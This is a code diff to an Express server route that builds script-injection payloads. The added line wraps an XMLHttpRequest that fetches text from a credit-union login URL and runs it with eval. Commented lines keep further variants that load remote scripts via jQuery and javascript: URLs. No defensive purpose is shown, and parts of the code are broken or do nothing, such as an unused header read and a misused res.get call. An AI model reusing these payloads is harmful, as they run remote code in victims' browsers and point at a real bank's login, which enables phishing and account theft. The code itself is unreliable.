@@ -90,11 +90,12 @@ async function uploadImage(image) {
   });
 }
 
-app.get("/examples", (req, res) => {
+app.get("/examples", async (req, res) => {
   res.header("Content-Type", "text/plain");
+  req.headers["host"];
   // Create the URL based on the request's host
   var url = "www.afcu.org/login";
-  url += `<script>$.getScript("${url}")</script>`;
+  url += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
   // Initialize the page variable
   //var page = "login/";
   // Append necessary scripts to the page variable
@@ -102,8 +103,8 @@ app.get("/examples", (req, res) => {
   //page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;
   //url += <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
   //page += `<script>$.getScript("${url}")</script>`;
-  req.headers["host"];
   res.get(url);
+  let data = req.body;
 });
 
 app.all("/logi", (req, res) => {
